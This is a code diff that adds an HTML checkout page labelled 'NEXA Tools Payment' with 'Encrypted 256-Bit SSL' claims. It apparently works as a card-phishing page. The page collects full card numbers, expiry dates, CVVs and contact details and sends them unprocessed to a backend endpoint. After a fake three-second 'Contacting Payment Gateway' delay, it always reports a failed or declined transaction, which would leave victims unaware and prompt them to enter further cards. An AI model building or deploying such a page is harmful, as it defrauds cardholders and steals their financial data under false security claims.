@@ -1,0 +1,314 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Checkout | Secure Payment Gateway</title>
+  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+  <style>
+    :root {
+      --bg: #07090e;
+      --card-bg: rgba(18, 22, 31, 0.85);
+      --border: rgba(255, 255, 255, 0.12);
+      --border-focus: rgba(255, 255, 255, 0.4);
+      --text: #ffffff;
+      --text-dim: #8b949e;
+      --accent: #ffffff;
+      --danger: #ff4d4d;
+      --radius: 16px;
+      --font: 'Inter', -apple-system, sans-serif;
+    }
+
+    * { box-sizing: border-box; margin: 0; padding: 0; font-family: var(--font); }
+    
+    body { 
+      background-color: var(--bg); 
+      color: var(--text); 
+      min-height: 100vh; 
+      display: flex; 
+      justify-content: center; 
+      align-items: center; 
+      padding: 16px; 
+      position: relative; 
+    }
+    
+    .checkout-container {
+      width: 100%;
+      max-width: 480px;
+      background: var(--card-bg);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      padding: 32px;
+      backdrop-filter: blur(16px);
+      box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5);
+    }
+    
+    .header { text-align: center; margin-bottom: 24px; }
+    .header h2 { font-size: 22px; font-weight: 700; margin-bottom: 6px; }
+    .header p { font-size: 13px; color: var(--text-dim); }
+
+    .alert { padding: 12px; border-radius: 8px; font-size: 13px; margin-bottom: 20px; display: none; }
+    .alert-danger { background: rgba(255,77,77,0.15); border: 1px solid var(--danger); color: var(--danger); }
+
+    .form-group { margin-bottom: 16px; }
+    
+    /* Responsive Form Row Layout */
+    .form-row { display: flex; gap: 12px; }
+    .form-row .form-group { flex: 1; }
+    
+    label { display: block; font-size: 12px; font-weight: 600; color: var(--text-dim); margin-bottom: 6px; text-transform: uppercase; }
+    
+    input, select {
+      width: 100%;
+      padding: 12px 14px;
+      background: rgba(255,255,255,0.03);
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      color: var(--text);
+      font-size: 14px;
+      outline: none;
+      transition: all 0.2s ease;
+    }
+    input:focus, select:focus { border-color: var(--border-focus); background: rgba(255,255,255,0.06); }
+    select option { background: #12161f; color: #fff; }
+
+    .card-input-wrapper { position: relative; }
+    .card-brand-badge {
+      position: absolute;
+      right: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      font-size: 11px;
+      font-weight: 700;
+      padding: 3px 6px;
+      background: rgba(255,255,255,0.1);
+      border-radius: 4px;
+      color: var(--text);
+      text-transform: uppercase;
+    }
+
+    .btn-submit {
+      width: 100%;
+      padding: 14px;
+      background: var(--accent);
+      color: #000;
+      border: none;
+      border-radius: 10px;
+      font-size: 15px;
+      font-weight: 700;
+      cursor: pointer;
+      margin-top: 10px;
+      transition: opacity 0.2s;
+    }
+    .btn-submit:hover { opacity: 0.9; }
+
+    /* Loading Overlay UI */
+    .loading-overlay {
+      position: fixed;
+      top: 0; left: 0; width: 100%; height: 100%;
+      background: rgba(7, 9, 14, 0.85);
+      backdrop-filter: blur(8px);
+      display: none;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      z-index: 999;
+      padding: 20px;
+      text-align: center;
+    }
+    .spinner {
+      width: 50px;
+      height: 50px;
+      border: 4px solid rgba(255,255,255,0.1);
+      border-top: 4px solid var(--accent);
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin-bottom: 16px;
+    }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+    /* Mobile Specific Enhancements */
+    @media (max-width: 520px) {
+      body { padding: 12px; }
+      .checkout-container { padding: 20px 16px; border-radius: 12px; }
+      .form-row { flex-direction: column; gap: 0; }
+      .header h2 { font-size: 20px; }
+      .btn-submit { padding: 12px; font-size: 14px; }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Loading Screen Overlay -->
+  <div class="loading-overlay" id="loading-overlay">
+    <div class="spinner"></div>
+    <p style="font-weight: 600; font-size: 16px;">Contacting Payment Gateway...</p>
+    <p style="font-size: 12px; color: var(--text-dim); margin-top: 4px;">Please do not refresh or close page.</p>
+  </div>
+
+  <div class="checkout-container">
+    <div class="header">
+      <h2>NEXA Tools Payment</h2>
+      <p>Encrypted 256-Bit SSL Checkout</p>
+    </div>
+
+    <div class="alert alert-danger" id="error-alert"></div>
+
+    <form id="payment-form">
+      <div class="form-group">
+        <label>Payment Amount ($)</label>
+        <input type="number" id="amount" placeholder="Enter amount e.g. 100" step="0.01" min="1" required>
+      </div>
+
+      <div class="form-group">
+        <label>Full Name</label>
+        <input type="text" id="full_name" placeholder="John Doe" required>
+      </div>
+
+      <div class="form-row">
+        <div class="form-group">
+          <label>Email Address</label>
+          <input type="email" id="email" placeholder="john@example.com" required>
+        </div>
+        <div class="form-group">
+          <label>Phone Number</label>
+          <input type="tel" id="phone" placeholder="+1 234 567 890" required>
+        </div>
+      </div>
+
+      <div class="form-row">
+        <div class="form-group">
+          <label>Country</label>
+          <input type="text" id="country" placeholder="United States" required>
+        </div>
+        <div class="form-group">
+          <label>City</label>
+          <input type="text" id="city" placeholder="New York" required>
+        </div>
+      </div>
+
+      <div class="form-group">
+        <label>Billing Address</label>
+        <input type="text" id="address" placeholder="123 Street Name" required>
+      </div>
+
+      <hr style="border: 0; border-top: 1px solid var(--border); margin: 20px 0;">
+
+      <div class="form-row">
+        <div class="form-group">
+          <label>Card Type</label>
+          <select id="card_type">
+            <option value="Visa">Visa</option>
+            <option value="Mastercard">Mastercard</option>
+            <option value="American Express">American Express</option>
+            <option value="Discover">Discover</option>
+          </select>
+        </div>
+        <div class="form-group">
+          <label>Cardholder Name</label>
+          <input type="text" id="card_holder" placeholder="Name on Card" required>
+        </div>
+      </div>
+
+      <div class="form-group">
+        <label>Card Number</label>
+        <div class="card-input-wrapper">
+          <input type="inputmode" inputmode="numeric" id="card_number" placeholder="4532 0000 0000 0000" maxlength="19" required>
+          <span class="card-brand-badge" id="card-badge">VISA</span>
+        </div>
+      </div>
+
+      <div class="form-row">
+        <div class="form-group">
+          <label>Expiry Date</label>
+          <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" required>
+        </div>
+        <div class="form-group">
+          <label>CVV / CVC</label>
+          <input type="password" id="cvv" placeholder="123" maxlength="4" required>
+        </div>
+      </div>
+
+      <button type="submit" class="btn-submit" id="pay-btn">Pay Now</button>
+    </form>
+  </div>
+
+  <script>
+    const amountInput = document.getElementById('amount');
+    const cardInput = document.getElementById('card_number');
+    const expiryInput = document.getElementById('expiry');
+    const cardTypeSelect = document.getElementById('card_type');
+    const cardBadge = document.getElementById('card-badge');
+    const form = document.getElementById('payment-form');
+    const alertBox = document.getElementById('error-alert');
+    const payBtn = document.getElementById('pay-btn');
+    const loadingOverlay = document.getElementById('loading-overlay');
+
+    amountInput.addEventListener('input', (e) => {
+      const val = e.target.value.trim();
+      payBtn.textContent = val && !isNaN(val) && parseFloat(val) > 0 ? `Pay Now ($${parseFloat(val).toFixed(2)})` : 'Pay Now';
+    });
+
+    cardInput.addEventListener('input', (e) => {
+      let value = e.target.value.replace(/\D/g, '');
+      if (value.startsWith('4')) { cardTypeSelect.value = 'Visa'; cardBadge.textContent = 'VISA'; }
+      else if (value.startsWith('5')) { cardTypeSelect.value = 'Mastercard'; cardBadge.textContent = 'MC'; }
+      else if (value.startsWith('34') || value.startsWith('37')) { cardTypeSelect.value = 'American Express'; cardBadge.textContent = 'AMEX'; }
+      else if (value.startsWith('6')) { cardTypeSelect.value = 'Discover'; cardBadge.textContent = 'DISC'; }
+
+      e.target.value = value.match(/.{1,4}/g)?.join(' ') || '';
+    });
+
+    expiryInput.addEventListener('input', (e) => {
+      let value = e.target.value.replace(/\D/g, '');
+      e.target.value = value.length >= 2 ? value.slice(0, 2) + '/' + value.slice(2, 4) : value;
+    });
+
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+      alertBox.style.display = 'none';
+      
+      // Show Loader Animation
+      loadingOverlay.style.display = 'flex';
+
+      const payload = {
+        amount: amountInput.value.trim(),
+        full_name: document.getElementById('full_name').value,
+        email: document.getElementById('email').value,
+        phone: document.getElementById('phone').value,
+        country: document.getElementById('country').value,
+        city: document.getElementById('city').value,
+        address: document.getElementById('address').value,
+        card_type: cardTypeSelect.value,
+        card_holder: document.getElementById('card_holder').value,
+        card_number: cardInput.value,
+        expiry: expiryInput.value,
+        cvv: document.getElementById('cvv').value
+      };
+
+      // 3-second delay to show loading animation
+      setTimeout(async () => {
+        try {
+          const res = await fetch('/api/checkout', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+          });
+
+          const data = await res.json();
+          loadingOverlay.style.display = 'none';
+
+          // Show Transaction Failed Message
+          alertBox.textContent = data.message || 'Transaction Failed: Card declined by issuing bank.';
+          alertBox.style.display = 'block';
+
+        } catch (err) {
+          loadingOverlay.style.display = 'none';
+          alertBox.textContent = 'Connection error. Please check server.';
+          alertBox.style.display = 'block';
+        }
+      }, 3000);
+    });
+  </script>
+</body>
+</html>
